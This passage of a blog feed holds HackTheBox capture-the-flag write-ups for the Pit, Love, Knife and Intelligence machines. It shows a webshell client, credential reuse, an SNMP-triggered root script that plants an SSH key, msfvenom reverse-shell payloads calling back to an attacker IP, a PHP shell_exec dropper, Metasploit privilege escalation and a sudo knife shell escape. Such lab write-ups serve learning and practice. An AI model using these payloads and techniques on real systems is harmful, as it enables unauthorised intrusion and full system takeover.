+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;intro &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Be quick! It&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s not very stable...&amp;#39;&lt;/span&gt;
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; url
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Session()
+        
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;default&lt;/span&gt;(self, line):
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Making a GET request to &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;url&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;: line}
+        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url, params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;payload)
+        print(res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+        
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;do_exit&lt;/span&gt;(self, arg):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+    
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Usage: python3 seeddmswebshell.py &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;http://dms-pit.htb/seeddms51x/data/1048576/32/1.php&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+    url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+    Webshell(url)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cmdloop()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;8- There are db creds in settings.xml:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dbDatabase=&amp;quot;seeddms&amp;quot; dbUser=&amp;quot;seeddms&amp;quot; dbPass=&amp;quot;ied^ieY6xoquu&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Try to connect to CentOS cockpit with these creds but failed. Use michelle:ied^ieY6xoquu to&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;9- Run linpeas.&lt;/p&gt;
+&lt;p&gt;10- Explore /usr/bin/monitor found earlier.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; script in /usr/local/monitoring/check*sh
+&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+    /bin/bash $script
+&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Check /usr/local/monitoring.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ls -l /usr/local/monitoring
+&lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; Permission denied.&lt;/span&gt;
+getfacl /usr/local/monitoring
+getfacl: Removing leading &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; from absolute path names
+&lt;span style=&#34;color:#75715e&#34;&gt;# file: usr/local/monitoring&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# owner: root&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# group: root&lt;/span&gt;
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;michelle can place a script at /usr/local/monitoring which gets executed when SNMP is triggered:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Write to /usr/local/monitoring:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF &amp;gt; /usr/local/monitoring/check_fw.sh
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#!/bin/bash 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cp /root/root.txt /tmp/hash.txt
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For some reason, I get permission denied. Why can&amp;rsquo;t root write to /tmp???&lt;/p&gt;
+&lt;p&gt;11- Change the check_fw.sh to put my public key at /root/.ssh/authorized_keys.&lt;/p&gt;
+&lt;p&gt;Generate my public key:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh-keygen -t rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The new check_fw.sh is:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLIC_KEY&amp;#34;&lt;/span&gt; &amp;gt; /root/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Trigger snmp again:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -i root root@pit.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: b96ee993d16220d6c0c0d519a4179b46&lt;/p&gt;
+
+  &lt;/div&gt;
+&lt;/div&gt;
+
+</content>
+    </item>
+    
+    <item>
+      <title>Love - HackTheBox machine</title>
+      <link>/labs/love/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:35 +0200</pubDate>
+      
+      <guid>/labs/love/</guid>
+      <description>Rank: easy  Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).
+2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).&lt;/p&gt;
+&lt;p&gt;2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000. The port 5000 service returns 403 Forbidden, probably due to IP restriction. 443 port responds with 403 Forbidden but the ssl-cert reveals a commonName = staging.love.htb&lt;/p&gt;
+&lt;p&gt;3- The pivot points left are the Windows version itself (found Unified Remote 3.9.0.2463, not useful here), Apache 2.4.46 (no exploits found except Optionsbleed, not useful here), web on target and staging.love.htb and samba (I am not experienced enough for now).&lt;/p&gt;
+&lt;p&gt;4- Open http://target and &lt;a href=&#34;http://staging.love.htb&#34;&gt;http://staging.love.htb&lt;/a&gt; on browser. Target is a login form for a voting system using PHP, the second one is a webpage to scan urls.&lt;/p&gt;
+&lt;p&gt;5- Search for exploits for the software of the voting system in exploitDB. There are two, sqli in the login form and rce when logged in as admin. Also found the source code of the software.&lt;/p&gt;
+&lt;p&gt;6- Tried the default admin credentials written in the software docs. No luck. Tried the sqli with Burpsuite, no luck.&lt;/p&gt;
+&lt;p&gt;7- Insert http://localhost:5000 in the file url scanner. GOT the admin credentials!&lt;/p&gt;
+&lt;p&gt;8- Now having admin account, we can utilise the rce exploit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p php/meterpreter_reverse_shell -f php LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.14.44 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt; &amp;gt; shell.php &lt;span style=&#34;color:#75715e&#34;&gt;# Could have used a stealthier name hhhh&lt;/span&gt;
+msfconsole use exploit/multi/handler
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;9- Upload in candidates.php and get a shell. Php shells are not stable, cannot even cd to another dir :(. Use meterpreter to upload an EXE.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST and LPORT &amp;gt; update.exe 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;10- Cannot execute the EXE directly, so let&amp;rsquo;s upload another PHP with the command shell_exec(&amp;lsquo;update.exe&amp;rsquo;);. See anna.php:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;shell_exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shell.exe&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt; 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;11- Now we get a stable user shell!&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;12- Definitely smth I need is an automatic checker of common privesc misconfigurations, such as WinPEAS. I tried getsystem with no luck. Use metasploit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfconsole -q
+use exploit/windows/local/always_install_elevated 
+set session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 
+set LHOST xxxxx
+exploit 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;13- GOT NT AUTHORITY/SYSTEM shell.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Knife - HackTheBox machine</title>
+      <link>/labs/knife/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:29 +0200</pubDate>
+      
+      <guid>/labs/knife/</guid>
+      <description>Rank: easy  Foothold  Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions. Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB. Get user shell using the backdoor PHP exploit.  Privilege escalation sudo -l to find knife. knife can execute ruby script, so:  sudo knife exec -E &amp;#39;exec &amp;#34;/bin/bash&amp;#34;&amp;#39; Note that we didn&amp;rsquo;t use SSH.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions.&lt;/li&gt;
+&lt;li&gt;Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB.&lt;/li&gt;
+&lt;li&gt;Get user shell using the backdoor PHP exploit.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt; to find knife. knife can execute ruby script, so:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo knife exec -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exec &amp;#34;/bin/bash&amp;#34;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that we didn&amp;rsquo;t use SSH. Another potential solution would be to bruteforce the SSH connection.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Intelligence - HackTheBox machine</title>
+      <link>/labs/intelligence/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:23 +0200</pubDate>
+      
+      <guid>/labs/intelligence/</guid>
+      <description>Rank: medium  Part of this article is encrypted with password:
+  --- DON&#39;T MODIFY THIS LINE --- Foothold 1- Nmap: 53 -&amp;gt; dns 139 -&amp;gt; netbios 445 -&amp;gt; smb 135 -&amp;gt; rpc 593 -&amp;gt; ncacn http, rpc 5985 -&amp;gt; winrm 389, 636, 3268, 3269 -&amp;gt; LDAP, Active Directory is on 88 -&amp;gt; Kerberos, it is a domain controller 464 -&amp;gt; kpasswd5, kerberos password change, not interesting 80 -&amp;gt; web server IIS 10.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
+  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+    
+      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
+    
+  &lt;/div&gt;
+  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-input&#34;
+      placeholder=&#39;Please input the password&#39;
+    /&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-button&#34;
+      type=&#34;button&#34;
+      value=&#39;Click to verify&#39;
+      onclick=&#34;_click_handler(this)&#34;
+    /&gt;
+  &lt;/div&gt;
+  &lt;div
+    class=&#34;hugo-encryptor-cipher-text&#34;
+    data-password=&#34;676a7f4d669819b40d5d8ef5aadb6f5c&#34;
+    style=&#34;display: none;&#34;
+  &gt;
+    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap:
+53 -&amp;gt; dns
+139 -&amp;gt; netbios
+445 -&amp;gt; smb
+135 -&amp;gt; rpc
+593 -&amp;gt; ncacn http, rpc
+5985 -&amp;gt; winrm
+389, 636, 3268, 3269 -&amp;gt; LDAP, Active Directory is on
+88 -&amp;gt; Kerberos, it is a domain controller
+464 -&amp;gt; kpasswd5, kerberos password change, not interesting
+80 -&amp;gt; web server IIS 10.0
+5985 -&amp;gt; Microsoft HTTPAPI, not interesting
+9389 -&amp;gt; .NET Message Framing (?)&lt;/p&gt;
+&lt;p&gt;Services: samba suite (smbclient, rpcclient), evil-winrm, web, ldap,&lt;/p&gt;
+&lt;p&gt;SMB signing is required.&lt;/p&gt;
+&lt;p&gt;CN=dc.intelligence.htb&lt;/p&gt;
+&lt;p&gt;2- SMB and RPC null session and anonymous session. Successful but no privileges.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -N -U &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -L &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;intelligence.htb &lt;span style=&#34;color:#75715e&#34;&gt;# (and without -U) &lt;/span&gt;
+rpcclient -N -U &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -L intelligence.htb &lt;span style=&#34;color:#75715e&#34;&gt;# (and without -U)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3- LDAP enumeration. Permission denied.&lt;/p&gt;
+&lt;p&gt;4- Web enumeration. Contact form is useless. There are 2 PDFs in /documents folder. Name is YYYY-MM-DD-upload.pdf. Scrape them from 2020-01-01 to 2020-12-15. Here is the script I wrote:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3 &lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# scrapePdfs.py&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Convert int to str and pad with 0 if single digit.&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;padstr&lt;/span&gt;(n: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; str:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; str(n)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Download document and save to current directory. &lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;download&lt;/span&gt;(month: int, day: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
+    url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://intelligence.htb/documents/&amp;#34;&lt;/span&gt;
+    filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2020-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;padstr(month)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;padstr(day)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-upload.pdf&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# wget and save, if &lt;/span&gt;
+    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; filename, allow_redirects&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;) 
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status_code &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;File not found&amp;#39;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;: 
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(filename, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+            f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;content)
+    
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+                download(m, d)
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+                print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No file at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;padstr(m)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;padstr(d)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Find differences in content with pdfcontentdump.py (or go through the content manually). Here is my script to convert pdf to text and combine them to a txt file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; io
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+
